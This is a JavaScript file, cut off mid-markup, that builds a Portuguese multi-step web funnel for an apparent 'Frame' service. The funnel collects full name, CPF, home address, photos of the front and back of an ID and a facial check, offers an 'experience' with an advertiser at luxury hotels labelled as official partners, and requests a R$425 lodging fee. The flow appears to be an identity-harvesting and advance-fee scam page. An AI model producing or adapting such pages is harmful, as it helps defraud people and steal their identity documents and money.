// ===== Injetar Meta Viewport para Responsividade em Mobile =====
const metaViewport = document.createElement('meta');
metaViewport.name = 'viewport';
metaViewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
document.head.appendChild(metaViewport);

// ===== Injetar Link de Fontes =====
const fontLink = document.createElement('link');
fontLink.href = 'https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600&display=swap';
fontLink.rel = 'preload';
fontLink.as = 'style';
fontLink.onload = function() { this.rel = 'stylesheet'; };
document.head.appendChild(fontLink);

// ===== Injetar jsPDF e autoTable =====
const jspdfScript = document.createElement('script');
jspdfScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
document.head.appendChild(jspdfScript);

const autotableScript = document.createElement('script');
autotableScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.20/jspdf.plugin.autotable.min.js';
document.head.appendChild(autotableScript);

// ===== Injetar Lottie Player =====
const lottieScript = document.createElement('script');
lottieScript.src = 'https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js';
document.head.appendChild(lottieScript);

// ===== Injetar CSS =====
const style = document.createElement('style');
style.textContent = `
:root {
  --bg-color: #f8f8f8;
  --text-color: #000;
  --accent-color: #AB865B;
  --accent-light: #D3AD83;
  --secondary-bg: #fff;
  --border-color: rgba(0,0,0,0.1);
  --shadow-color: rgba(0,0,0,0.1);
  --input-bg: #fff;
  --error-color: #ff4d4d;
  --note-bg: #F4E8DB;
  --primary-color: #AB865B; /* Centralized primary color */
  --dark-text: #202020;
}
html, body {
  height: 100%;
  margin: 0;
  padding: 0;
  background: linear-gradient(180deg, #f9f9f9 0%, #f0ede9 100%);
  display: flex;
  align-items: center;
  justify-content: center;
  font-family: 'Montserrat', sans-serif;
  color: var(--text-color);
  scroll-behavior: smooth;
}
.container {
  width: 90%;
  max-width: 390px;
  background: var(--secondary-bg);
  border-radius: 16px;
  box-shadow: 0 8px 32px rgba(0,0,0,0.08);
  backdrop-filter: blur(8px);
  padding: 16px;
  position: relative;
  z-index: 10;
  overflow-y: auto;
  max-height: 90vh;
  margin: 0 auto;
}
.progress-bar {
  height: 4px;
  background: var(--border-color);
  border-radius: 2px;
  margin-bottom: 20px;
  position: sticky;
  top: 0;
  z-index: 11;
}
.progress-fill {
  height: 100%;
  background: var(--primary-color);
  width: 0;
  transition: width 0.4s ease;
  border-radius: 2px;
}
.step {
  display: none;
  opacity: 0;
  transform: translateY(20px);
  transition: all 0.4s ease;
  animation: fadeIn 0.4s ease forwards;
}
.step.active {
  display: block;
  opacity: 1;
  transform: translateY(0);
}
h2 {
  font-size: 1.4rem;
  font-weight: 600;
  margin-bottom: 16px;
  text-align: center;
}
p {
  font-size: 0.95rem;
  color: var(--text-color);
  margin-bottom: 16px;
  text-align: center;
}
.input-group {
  margin-bottom: 12px;
  position: relative;
}
.input-group label {
  display: block;
  font-size: 0.95rem;
  font-weight: 500;
  margin-bottom: 6px;
  text-align: left;
}
.input-group input, .input-group select {
  width: 100%;
  padding: 12px 16px;
  border: 1px solid var(--border-color);
  border-radius: 24px;
  background: var(--input-bg);
  font-size: 1rem;
  outline: none;
  transition: border 0.2s ease, box-shadow 0.2s ease;
  color: var(--text-color);
}
.input-group input:focus, .input-group select:focus {
  border: 1px solid var(--primary-color);
  box-shadow: 0 0 0 2px rgba(171,134,91,0.25);
}
.input-group.error input, .input-group.error select {
  border: 1px solid var(--error-color);
}
.error-message {
  font-size: 0.8rem;
  color: var(--error-color);
  margin-top: 4px;
  text-align: left;
  display: none;
}
.input-group.error .error-message {
  display: block;
}
.btn {
  padding: 14px 24px;
  border-radius: 24px;
  cursor: pointer;
  font-size: 1rem;
  border: none;
  background: var(--primary-color);
  color: #fff;
  transition: all 0.3s ease;
  font-weight: 500;
  display: block;
  width: 100%;
  text-align: center;
  position: relative;
}
.btn:disabled {
  background: var(--border-color);
  cursor: not-allowed;
}
.btn:hover:not(:disabled) {
  background: var(--accent-light);
  transform: translateY(-1px);
}
.btn.secondary {
  background: transparent;
  border: 1px solid var(--primary-color);
  color: var(--primary-color);
}
.checkbox-group {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 0.8rem;
  margin-top: 12px;
}
.checkbox-group input {
  accent-color: var(--primary-color);
}
.upload {
  text-align: center;
  margin-bottom: 20px;
}
.circle-upload {
  width: 120px;
  height: 120px;
  border-radius: 50%;
  background: var(--border-color);
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 8px;
  cursor: pointer;
  position: relative;
  overflow: hidden;
}
.circle-upload img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  loading: lazy;
}
.circle-upload .spinner {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  display: none;
}
.upload-text {
  font-size: 0.8rem;
  color: var(--text-color);
}
.upload input {
  display: none;
}
.date-selection {
  margin-bottom: 20px;
}
.date-fullscreen {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: var(--secondary-bg);
  display: none;
  flex-direction: column;
  z-index: 10000;
  transform: translateY(100%);
  transition: transform 0.3s ease;
}
.date-fullscreen.show {
  display: flex;
  transform: translateY(0);
}
.calendar-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
  padding: 20px 20px 0;
  position: sticky;
  top: 0;
  background: var(--secondary-bg);
  z-index: 1;
}
.month-title {
  font-weight: 600;
  font-size: 1.2rem;
}
.calendar-grid {
  display: grid;
  grid-template-columns: repeat(7, 1fr);
  gap: 8px;
  padding: 0 20px;
}
.day-header {
  font-weight: 600;
  text-align: center;
}
.day {
  text-align: center;
  padding: 12px;
  border-radius: 50%;
  cursor: pointer;
  transition: background 0.2s, transform 0.2s;
  font-size: 1rem;
}
.day:hover {
  background: var(--note-bg);
  transform: scale(1.05);
}
.day.selected {
  background: var(--primary-color);
  color: #fff;
}
.day.disabled {
  color: var(--border-color);
  cursor: not-allowed;
}
.calendar-actions {
  display: flex;
  justify-content: space-between;
  margin-top: auto;
  padding: 20px;
  position: sticky;
  bottom: 0;
  background: var(--secondary-bg);
  gap: 24px;
}
.calendar-actions .btn {
  width: 120px;
  padding-left: 0;
  padding-right: 0;
}
.calendar-actions .btn.secondary {
  border-radius: 24px;
}
.calendar-actions .btn#close-dates {
  font-size: 0.9rem;
  padding: 8px 16px;
  width: auto;
}
.city-select {
  margin-bottom: 20px;
}
.city-select input {
  padding-left: 40px;
  text-align: center;
  border-radius: 32px;
  padding: 16px 48px;
  font-size: 1.2rem;
}
#city-list {
  position: absolute;
  background: var(--secondary-bg);
  border: 1px solid var(--border-color);
  border-radius: 8px;
  max-height: 200px;
  overflow-y: auto;
  z-index: 10;
  width: 100%;
  display: none;
  box-shadow: 0 4px 12px var(--shadow-color);
}
.city-option {
  padding: 16px;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 12px;
  transition: background 0.2s;
}
.city-option:hover {
  background: var(--note-bg);
}
.city-option svg {
  width: 24px;
  height: 24px;
}
.hotel-list {
  display: flex;
  flex-direction: column;
  gap: 24px;
}
.hotel-card {
  background: var(--input-bg);
  border-radius: 16px;
  overflow: hidden;
  box-shadow: 0 4px 12px var(--shadow-color);
  display: flex;
  flex-direction: column;
  margin-bottom: 24px;
  transition: transform 0.2s, box-shadow 0.2s;
  max-width: 380px;
  margin: 0 auto;
}
.hotel-card:hover {
  transform: translateY(-4px);
  box-shadow: 0 8px 24px var(--shadow-color);
}
.hotel-img-container {
  position: relative;
}
.hotel-img {
  width: 100%;
  height: 200px;
  object-fit: cover;
  loading: lazy;
}
.hotel-selo {
  position: absolute;
  top: 12px;
  left: 12px;
  background: rgba(244, 232, 219, 0.8);
  padding: 4px 8px;
  border-radius: 12px;
  font-size: 0.75rem;
  color: var(--text-color);
  opacity: 0.9;
}
.hotel-favorite {
  position: absolute;
  top: 12px;
  right: 12px;
  cursor: pointer;
  width: 24px;
  height: 24px;
  fill: none;
  stroke: var(--text-color);
  stroke-width: 1.5;
  transition: fill 0.2s, stroke 0.2s;
}
.hotel-favorite.filled {
  fill: var(--accent-color);
  stroke: var(--accent-color);
}
.hotel-info {
  padding: 16px;
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.hotel-name {
  font-weight: 600;
  font-size: 1.1rem;
}
.hotel-desc {
  font-size: 0.85rem;
  color: var(--text-color);
  line-height: 1.4;
  text-align: left;
}
.hotel-actions {
  padding: 0 16px 16px;
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.details-link {
  font-size: 0.85rem;
  color: var(--primary-color);
  cursor: pointer;
  text-align: center;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 4px;
  transition: color 0.2s;
}
.details-link:hover {
  color: var(--accent-light);
}
.popup-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.6);
  backdrop-filter: blur(4px);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 10000;
  transition: opacity 0.3s ease;
}
.popup-content {
  background: var(--secondary-bg);
  width: 100%;
  max-width: 390px;
  padding: 24px;
  border-top-left-radius: 20px;
  border-top-right-radius: 20px;
  transform: translateY(100%);
  transition: transform 0.3s ease;
  display: flex;
  flex-direction: column;
  gap: 16px;
  max-height: 80vh;
  overflow-y: auto;
}
.popup-overlay.show {
  display: flex;
}
.popup-overlay.show .popup-content {
  transform: translateY(0);
}
@media (min-width: 768px) {
  .container {
    max-width: 600px;
    padding: 24px;
  }
  .hotel-list {
    grid-template-columns: repeat(2, 1fr);
  }
  .popup-content {
    flex-direction: row;
    border-radius: 20px;
    max-height: none;
  }
}
.popup-img {
  width: 100%;
  height: auto;
  border-radius: 16px;
}
.services-list {
  display: flex;
  flex-wrap: wrap;
  gap: 12px;
}
.service-item {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 0.9rem;
}
.close-popup {
  position: absolute;
  top: 16px;
  right: 16px;
  cursor: pointer;
  font-size: 1.4rem;
  color: var(--text-color);
  transition: color 0.2s;
}
.close-popup:hover {
  color: var(--accent-color);
}
.custom-city-popup .popup-content {
  align-items: center;
}
.custom-options {
  width: 100%;
  display: flex;
  flex-direction: row;
  gap: 16px;
}
.custom-option {
  background: var(--primary-color);
  padding: 16px;
  border-radius: 16px;
  cursor: pointer;
  transition: background 0.2s, transform 0.2s;
  text-align: left;
  flex: 1;
  color: #fff;
}
.custom-option:hover {
  background: var(--accent-light);
  transform: translateY(-2px);
}
.custom-option small {
  display: block;
  font-size: 0.8rem;
  color: #fff;
  text-align: left;
}
.custom-option.self {
  background: transparent;
  border: 1px solid var(--primary-color);
  color: #000;
}
.custom-option.self small {
  color: var(--dark-text);
}
.confirm-toast {
  position: fixed;
  top: 20px;
  left: 50%;
  transform: translateX(-50%);
  background: var(--primary-color);
  color: #fff;
  padding: 12px 24px;
  border-radius: 24px;
  z-index: 10001;
  animation: fadeInOut 3s ease;
  display: none;
  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
}
@keyframes fadeInOut {
  0% { opacity: 0; transform: translate(-50%, -20px); }
  10% { opacity: 1; transform: translate(-50%, 0); }
  90% { opacity: 1; transform: translate(-50%, 0); }
  100% { opacity: 0; transform: translate(-50%, -20px); }
}
.resumo-card {
  background: var(--note-bg);
  padding: 16px;
  border-radius: 16px;
  margin-top: 20px;
}
.resumo-item {
  display: flex;
  justify-content: space-between;
  margin-bottom: 8px;
  font-size: 0.9rem;
}
.hospedagem-option {
  margin-top: 16px;
  text-align: center;
}
.loading-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(255,255,255,0.8);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 10001;
  flex-direction: column;
}
.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid var(--border-color);
  border-top: 4px solid var(--primary-color);
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-bottom: 12px;
}
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.orientation-alert {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: var(--secondary-bg);
  padding: 20px;
  border-radius: 16px;
  text-align: center;
  z-index: 10002;
  display: none;
  box-shadow: 0 4px 15px var(--shadow-color);
}
@keyframes fadeIn {
  from { opacity: 0; transform: translateY(10px); }
  to { opacity: 1; transform: translateY(0); }
}
.row {
  display: flex;
  gap: 12px;
}
.row .input-group {
  flex: 1;
}
@media (max-width: 767px) {
  .row {
    flex-direction: column;
    gap: 12px;
  }
}
.cpf-box {
  margin: 20px 0;
  padding: 14px;
  border: 2px dashed var(--primary-color);
  border-radius: 8px;
  font-weight: 600;
  font-size: 1rem;
  background: var(--input-bg);
  color: var(--text-color);
  text-align: center;
}
.note {
  font-size: 0.8rem;
  color: var(--text-color);
  margin-top: 8px;
  text-align: left;
}
.privacy {
  margin-top: 20px;
  font-size: 0.8rem;
  color: var(--text-color);
  text-align: center;
}
.privacy a {
  color: var(--primary-color);
  text-decoration: underline;
}
#verification-pre ul {
  list-style: none;
  padding: 0;
  text-align: left;
}
#verification-pre li {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 12px;
  font-size: 0.9rem;
}
#verification-pre li::before {
  content: '';
  width: 24px;
  height: 24px;
  background: var(--note-bg);
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 0.8rem;
}
#camera-preview-container {
  position: relative;
  width: 100%;
  max-width: 320px;
  margin: 0 auto 16px;
  border-radius: 50%;
  overflow: hidden;
  aspect-ratio: 1;
  border: 3px solid var(--primary-color);
  background: #000;
}
#camera-preview {
  width: 100%;
  height: 100%;
  object-fit: cover;
  transform: scaleX(-1);
}
#verification-success {
  font-size: 1.2rem;
  color: var(--primary-color);
  margin-top: 16px;
}
#verification-instructions {
  font-size: 0.9rem;
  margin-bottom: 16px;
}
#chatbot {
  position: fixed;
  bottom: 20px;
  right: 20px;
  z-index: 10002;
}
.warning-popup {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: var(--secondary-bg);
  padding: 24px 32px;
  border-radius: 16px;
  text-align: center;
  z-index: 10002;
  display: none;
  box-shadow: 0 4px 15px var(--shadow-color);
  max-width: 90%;
  animation: fadeInScale 0.3s ease;
}
.warning-popup button {
  margin-top: 12px;
}
.blocked-popup {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: var(--secondary-bg);
  padding: 24px 32px;
  border-radius: 16px;
  text-align: center;
  z-index: 10002;
  display: none;
  box-shadow: 0 4px 15px var(--shadow-color);
  max-width: 90%;
}
.blocked-popup #timer {
  font-size: 1.2rem;
  color: var(--primary-color);
}
#city-suggestions {
  display: flex;
  flex-direction: column;
  gap: 8px;
  margin-top: 16px;
}
.city-suggestion {
  background: var(--note-bg);
  padding: 12px;
  border-radius: 12px;
  cursor: pointer;
  display: flex;
  justify-content: space-between;
  align-items: center;
  transition: background 0.2s;
}
.city-suggestion:hover {
  background: var(--accent-light);
}
.city-suggestion small {
  font-size: 0.75rem;
  color: var(--text-color);
}
.selected-summary {
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
  background: #fff;
  padding: 16px;
  box-shadow: 0 -2px 8px rgba(0,0,0,0.1);
  display: none;
  z-index: 1000;
  text-align: center;
}
.selected-summary.show {
  display: block;
}
.selected-summary p {
  margin-bottom: 8px;
  text-align: center;
}
.selected-summary button {
  width: auto;
  margin: 0 auto;
}
.bottom-sheet {
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
  background: var(--secondary-bg);
  border-top-left-radius: 20px;
  border-top-right-radius: 20px;
  padding: 24px;
  transform: translateY(100%);
  transition: transform 0.3s ease;
  z-index: 10000;
  max-height: 70vh;
  overflow-y: auto;
  box-shadow: 0 -4px 16px rgba(0,0,0,0.08);
}
.bottom-sheet.show {
  transform: translateY(0);
}
.bottom-sheet .popup-content {
  flex-direction: column;
}
.bottom-sheet .popup-img {
  width: 100%;
  margin-bottom: 16px;
}
.bottom-sheet .btn {
  position: sticky;
  bottom: 0;
  width: calc(100% - 48px);
  margin: 16px auto 0;
}
.hotel-header {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 16px;
}
.hotel-photo {
  width: 80px;
  height: 80px;
  border-radius: 8px;
}
.hotel-rating {
  font-size: 0.8rem;
  display: flex;
  align-items: center;
  gap: 4px;
}
.edit-link {
  font-size: 0.8rem;
  color: var(--primary-color);
  cursor: pointer;
}
.incluso-badge {
  background: var(--note-bg);
  color: var(--primary-color);
  padding: 4px 12px;
  border-radius: 16px;
  font-size: 0.8rem;
  margin-bottom: 16px;
  display: inline-block;
  animation: pulse 1.5s infinite;
}
@keyframes pulse {
  0% { transform: scale(1); }
  50% { transform: scale(1.05); }
  100% { transform: scale(1); }
}
.payment-popup {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: var(--secondary-bg);
  padding: 24px;
  border-radius: 16px;
  text-align: center;
  z-index: 10002;
  display: none;
  box-shadow: 0 4px 15px var(--shadow-color);
  max-width: 90%;
  animation: fadeInScale 0.3s ease;
}
.payment-popup button {
  margin-top: 12px;
}
.faq-popup {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: var(--secondary-bg);
  padding: 32px;
  border-radius: 16px;
  text-align: left;
  z-index: 10002;
  display: none;
  box-shadow: 0 4px 15px var(--shadow-color);
  max-width: 90%;
  animation: fadeInScale 0.3s ease;
  width: 90%;
}
.faq-list {
  list-style: none;
  padding: 0;
}
.faq-list li {
  margin-bottom: 16px;
}
.faq-question {
  font-weight: 600;
}
.faq-answer {
  font-size: 0.85rem;
}
.help-sheet {
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
  background: var(--secondary-bg);
  border-top-left-radius: 20px;
  border-top-right-radius: 20px;
  padding: 24px;
  transform: translateY(100%);
  transition: transform 0.3s ease;
  z-index: 10000;
  max-height: 70vh;
  overflow-y: auto;
  box-shadow: 0 -4px 16px rgba(0,0,0,0.08);
}
.help-sheet.show {
  transform: translateY(0);
}
.help-list {
  list-style: none;
  padding: 0;
}
.help-list li {
  padding: 12px;
  border-bottom: 1px solid var(--border-color);
  cursor: pointer;
}
.calendar-nav {
  display: flex;
  gap: 8px;
}
.calendar-nav button {
  background: none;
  border: none;
  cursor: pointer;
  font-size: 1.2rem;
}
.load-more-dates {
  background: var(--note-bg);
  padding: 12px;
  border-radius: 24px;
  margin: 16px auto;
  display: block;
  width: fit-content;
  cursor: pointer;
}
.comunicado-card {
  background: var(--input-bg);
  border-radius: 16px;
  overflow: hidden;
  box-shadow: 0 4px 16px rgba(0,0,0,0.08);
  display: flex;
  flex-direction: column;
  margin-bottom: 16px;
}
.comunicado-selo {
  position: absolute;
  top: 12px;
  left: 12px;
  background: var(--note-bg);
  padding: 4px 8px;
  border-radius: 12px;
  font-size: 0.8rem;
  color: var(--text-color);
}
.overlay-black {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.3);
  display: none;
  z-index: 9999;
}
.overlay-black.show {
  display: block;
}
`;
document.head.appendChild(style);
// ===== Dados dos Hotéis =====
const hotels = {
  'São Paulo, SP': [
    {
      name: 'Rosewood São Paulo',
      desc: 'Localizado na histórica Cidade Matarazzo em Bela Vista, próximo à Av. Paulista; oasis urbano com Torre Mata Atlântica projetada por Jean Nouvel, piscina infinita no rooftop, seis opções gastronômicas premiadas, spa sofisticado e serviço impecável – eleito o melhor hotel da América do Sul em 2024.',
      profileImg: 'https://dynamic-media-cdn.tripadvisor.com/media/photo-o/2c/1b/47/10/premier-two-queens.jpg',
      largeImg: 'https://dynamic-media-cdn.tripadvisor.com/media/photo-o/2c/1b/46/fd/matarazzo-suite-room.jpg',
      selo: 'Parceiro oficial da Frame',
      services: ['Wi-Fi', 'Estacionamento', 'Café da manhã', 'Academia', 'Piscina']
    },
    {
      name: 'Hotel Fasano São Paulo',
      desc: 'Hotel destaque pela gastronomia e hospitalidade familiar; projeto assinado por Isay Weinfeld e Márcio Kogan, com restaurante renomado e serviço de alto padrão.',
      profileImg: 'https://dynamic-media-cdn.tripadvisor.com/media/photo-o/1b/71/6a/bd/hotel-fasano-sao-paulo.jpg',
      largeImg: 'https://www.fasano.com.br/wp-content/uploads/2023/06/4.Suite-Deluxe.jpg',
      selo: 'Parceiro oficial da Frame',
      services: ['Wi-Fi', 'Estacionamento', 'Café da manhã', 'Academia', 'Piscina']
    },
    {
      name: 'Emiliano São Paulo',
      desc: 'Localizado no coração dos Jardins (Rua Oscar Freire), o Emiliano oferece acomodações amplas com serviço discreto, spa e gastronomia sofisticada.',
      profileImg: 'https://ak-d.tripcdn.com/images/220p0z000000mp0s969E3_W_1280_853_R5.webp',
      largeImg: 'https://ak-d.tripcdn.com/images/0220e12000l10zyo585F8_W_1280_853_R5.webp',
      selo: 'Parceiro oficial da Frame',
      services: ['Wi-Fi', 'Estacionamento', 'Café da manhã', 'Academia', 'Piscina']
    },
    {
      name: 'Hotel Unique',
      desc: 'Marcos arquitetônicos assinados por Ruy Ohtake; conhecido pelo design singular, restaurante/rooftop com vista e experiência de serviço voltada a eventos e gastronomia.',
      profileImg: 'https://dynamic-media-cdn.tripadvisor.com/media/photo-o/2d/dd/ba/f7/presidencial-oasis-suite.jpg',
      largeImg: 'https://dynamic-media-cdn.tripadvisor.com/media/photo-o/17/16/be/96/oasis-suite.jpg',
      selo: 'Parceiro oficial da Frame',
      services: ['Wi-Fi', 'Estacionamento', 'Café da manhã', 'Academia', 'Piscina']
    }
  ],
  'Rio de Janeiro, RJ': [
    {
      name: 'Copacabana Palace',
      desc: 'Hotel cinco estrelas tradicional em Copacabana, conhecido pelo serviço de excelência e vista para o mar.',
      profileImg: 'https://img.belmond.com/photos/cop/cop-ext05.jpg',
      largeImg: 'https://img.belmond.com/photos/cop/cop-acc-suite-penthouse-ocean-view06.jpg',
      selo: 'Parceiro oficial da Frame',
      services: ['Wi-Fi', 'Estacionamento', 'Café da manhã', 'Academia', 'Piscina']
    },
    {
      name: 'Hotel Fasano Rio de Janeiro',
      desc: 'Localizado em Ipanema, combina design contemporâneo e gastronomia de alto nível.',
      profileImg: 'https://fasano.com.br/wp-content/uploads/2023/10/Piscina_Fasano-Rio_danielpinheiro%C2%A9-3.jpg',
      largeImg: 'https://fasano.com.br/wp-content/uploads/2023/10/Quarto-DLX_HFRJ_credBruno-Fioravanti-2.jpg',
      selo: 'Parceiro oficial da Frame',
      services: ['Wi-Fi', 'Estacionamento', 'Café da manhã', 'Academia', 'Piscina']
    },
    {
      name: 'Emiliano Rio',
      desc: 'Hotel boutique à beira-mar, com ambiente intimista e serviço personalizado.',
      profileImg: 'https://emiliano.com.br/wp-content/uploads/2016/10/emiliano.com.br-004-fernandoguerra-1.jpg',
      largeImg: 'https://emiliano.com.br/wp-content/uploads/2016/10/emiliano.com.br-oceanjuniorsuite-rio-scaled.jpeg',
      selo: 'Parceiro oficial da Frame',
      services: ['Wi-Fi', 'Estacionamento', 'Café da manhã', 'Academia', 'Piscina']
    }
  ],
  // ... add other cities as before
};

const cities = Object.keys(hotels);

const prohibitedWordsList = ['cu', 'pau', 'ppk', 'goza', 'chupa', 'puta', 'kids', 'kid', 'baby', 'bebe', 'cp', 'porno', 'estupro', 'estuprador', 'buceta', 'caralho', 'foder', 'fode', 'transar', 'sexo', 'bucetinha', 'roubar', 'exterminar', 'cuzinho', 'chupetinha', 'viado', 'baitola', 'prostituta', 'pedofilo', 'bct', 'nuds', 'leitada', 'fetiche', 'penis', 'vagina', 'se fuder', 'pepeka', 'piroca', 'gozada', 'pedofilia', 'violencia', 'ameaca', 'drogas', 'ilegal'];
const prohibitedWords = new RegExp('\\b(' + prohibitedWordsList.join('|') + ')\\b', 'i');

const cpfRegex = /^\d{3}\.\d{3}\.\d{3}-\d{2}$/;

// ===== Injetar HTML =====
document.body.innerHTML = `
  <div class="container">
    <div class="progress-bar"><div class="progress-fill"></div></div>
    <div id="step1" class="step active">
      <h2>Confirme sua identidade</h2>
      <p>Preencha seus dados conforme seus documentos oficiais. Essa medida visa proteger a comunidade da Frame.</p>
      <div class="input-group">
        <label for="nome">Informe seu nome completo</label>
        <input type="text" id="nome" placeholder="Ex: João da Silva Oliveira">
        <div class="error-message"></div>
      </div>
      <div class="input-group">
        <label for="cpf">CPF</label>
        <input type="text" id="cpf" placeholder="000.000.000-00">
        <div class="tooltip">Dados corretos garantem a não reprovação do agendamento</div>
        <div class="error-message"></div>
      </div>
      <div class="input-group">
        <label for="rua">Rua</label>
        <input type="text" id="rua" placeholder="Ex: Rua das Flores">
        <div class="error-message"></div>
      </div>
      <div class="row">
        <div class="input-group">
          <label for="bairro">Bairro</label>
          <input type="text" id="bairro" placeholder="Ex: Centro">
          <div class="error-message"></div>
        </div>
        <div class="input-group">
          <label for="numero">Número</label>
          <input type="text" id="numero" placeholder="Ex: 123">
          <div class="error-message"></div>
        </div>
      </div>
      <div class="row">
        <div class="input-group">
          <label for="cidade">Cidade</label>
          <input type="text" id="cidade" placeholder="Ex: São Paulo">
          <div class="error-message"></div>
        </div>
        <div class="input-group">
          <label for="estado">Estado</label>
          <select id="estado">
            <option value="" disabled selected>Selecione</option>
            <option value="SP">SP</option>
            <option value="RJ">RJ</option>
            <option value="MG">MG</option>
            <option value="RS">RS</option>
            <option value="BA">BA</option>
            <option value="PR">PR</option>
          </select>
          <div class="error-message"></div>
        </div>
      </div>
      <button class="btn" id="step1-btn" disabled>Prosseguir</button>
      <div class="privacy">Seus dados estão protegidos conforme nossa <a href="https://frameag.com/privacy" target="_blank">Política de Privacidade</a>.</div>
    </div>
    <div id="step2" class="step">
      <h2>Personalize seu perfil</h2>
      <p>Adicione uma foto de perfil e configure suas preferências de exibição.</p>
      <label class="upload">
        <input type="file" id="profilePic" accept="image/jpeg,image/png">
        <div class="circle-upload" id="profileCircle"><svg width="24" height="24" fill="var(--primary-color)"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41 0.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg></div>
        <div class="spinner"></div>
        <div class="upload-text">Foto de perfil (opcional)</div>
      </label>
      <div class="input-group">
        <label for="displayName">Nome de exibição</label>
        <input type="text" id="displayName" placeholder="Ex: João Silva">
        <div class="error-message"></div>
      </div>
      <div class="input-group">
        <label for="showAge">Exibir sua idade para a anunciante?</label>
        <select id="showAge">
          <option value="" disabled selected>Selecione</option>
          <option value="yes">Sim</option>
          <option value="no">Não</option>
        </select>
        <div class="note">Nota: A idade será verificada com base nos documentos enviados na próxima etapa.</div>
        <div class="error-message"></div>
      </div>
      <div class="checkbox-group">
        <input type="checkbox" id="terms">
        <label for="terms">Concordo com os termos do contrato e tratamento de dados.</label>
      </div>
      <button class="btn" id="step2-btn" disabled>Prosseguir</button>
    </div>
    <div id="step3" class="step">
      <h2>Escolha o tipo de documento</h2>
      <p>Selecione qual documento deseja enviar na próxima etapa de verificação da Frame:</p>
      <div class="input-group">
        <select id="docType">
          <option value="" disabled selected>Selecione</option>
          <option value="CNH">CNH (Carteira de Motorista)</option>
          <option value="RG">RG (Identidade)</option>
          <option value="Passaporte">Passaporte</option>
        </select>
        <div class="error-message"></div>
      </div>
      <button class="btn" id="step3-btn" disabled>Prosseguir</button>
    </div>
    <div id="step4" class="step">
      <h2>Envie seus documentos</h2>
      <p>Seus documentos devem representar o CPF abaixo:</p>
      <div class="cpf-box" id="cpfBox"></div>
      <p id="chosenDoc"></p>
      <label class="upload">
        <input type="file" id="docFrontInput" accept="image/jpeg,image/png">
        <div class="circle-upload" id="docFront"><svg width="24" height="24" fill="var(--primary-color)"><path d="M12 5v14M5 12h14"/></svg></div>
        <div class="spinner"></div>
        <div class="upload-text">Frente do documento</div>
      </label>
      <label class="upload">
        <input type="file" id="docBackInput" accept="image/jpeg,image/png">
        <div class="circle-upload" id="docBack"><svg width="24" height="24" fill="var(--primary-color)"><path d="M12 5v14M5 12h14"/></svg></div>
        <div class="spinner"></div>
        <div class="upload-text">Verso do documento</div>
      </label>
      <button class="btn" id="step4-btn" disabled>Prosseguir</button>
    </div>
    <div id="step5" class="step">
      <h2>Selecione a data e hotel</h2>
      <div class="date-selection">
        <label for="dates">Datas da experiência</label>
        <input type="text" id="dates" placeholder="Selecione datas" readonly>
      </div>
      <div class="city-select">
        <label for="city-input">Cidade</label>
        <input type="text" id="city-input" placeholder="Busque uma cidade">
        <div id="city-list"></div>
        <div id="custom-city-link" class="details-link">Minha cidade não está na lista</div>
      </div>
      <div id="hotel-list" class="hotel-list"></div>
      <button class="btn" id="step5-btn" disabled>Prosseguir</button>
    </div>
    <div id="step6" class="step">
      <h2>Resumo da experiência</h2>
      <div class="resumo-card">
        <div class="resumo-item"><span>Nome:</span><span id="resumo-nome"></span></div>
        <div class="resumo-item"><span>Data:</span><span id="resumo-dates"></span></div>
        <div class="resumo-item"><span>Local:</span><span id="resumo-hotel"></span></div>
        <div class="resumo-item"><span>Verificação facial:</span><span>Pendente</span></div>
      </div>
      <div class="hospedagem-option">
        <p>Aproveite hospedagem completa com valor especial Frame: R$ 425,00. O valor cobre sua permanência integral no hotel parceiro, após o término da experiência.</p>
        <button class="btn" id="add-hospedagem">Adicionar hospedagem completa — R$ 425,00</button>
        <div class="details-link" id="skip-hospedagem">Seguir sem hospedagem completa</div>
      </div>
      <button class="btn" id="go-to-payment" style="display:none;">Ir para pagamento</button>
